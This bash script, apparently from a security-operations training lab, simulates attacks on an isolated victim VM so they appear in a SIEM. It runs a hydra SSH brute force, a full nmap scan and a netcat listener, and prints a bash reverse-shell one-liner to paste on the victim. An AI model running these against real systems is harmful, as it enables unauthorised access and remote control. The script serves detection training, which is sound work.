#!/bin/bash
#
# simulate-attacks.sh
# Mini SOC Lab — reference commands for simulating attacks against a lab victim VM.
#
# ⚠️ LAB USE ONLY. Run these only against machines you own, on an isolated
# network with no internet exposure. This script is meant to be read and
# run step-by-step (not blindly executed end-to-end), so you understand what
# each command does and can watch it show up in your SIEM in real time.
#
# Usage: ./simulate-attacks.sh <victim-ip> <scenario>
#   scenario: bruteforce | portscan | reverseshell-listener

set -euo pipefail

VICTIM_IP="${1:-}"
SCENARIO="${2:-}"

if [[ -z "$VICTIM_IP" || -z "$SCENARIO" ]]; then
  echo "Usage: $0 <victim-ip> <bruteforce|portscan|reverseshell-listener>"
  exit 1
fi

case "$SCENARIO" in

  bruteforce)
    echo "[*] Simulating SSH brute force against $VICTIM_IP"
    echo "[*] Requires: hydra, a wordlist (e.g. rockyou.txt)"
    hydra -l testuser -P /usr/share/wordlists/rockyou.txt "ssh://$VICTIM_IP"
    ;;

  portscan)
    echo "[*] Simulating full port scan against $VICTIM_IP"
    echo "[*] Requires: nmap"
    nmap -sS -sV -p- "$VICTIM_IP"
    ;;

  reverseshell-listener)
    echo "[*] Starting a netcat listener on port 4444"
    echo "[*] On the VICTIM machine, run this command manually to simulate a compromised process:"
    echo "      bash -i >& /dev/tcp/<this-attacker-ip>/4444 0>&1"
    nc -lvnp 4444
    ;;

  *)
    echo "Unknown scenario: $SCENARIO"
    echo "Valid options: bruteforce, portscan, reverseshell-listener"
    exit 1
    ;;
esac
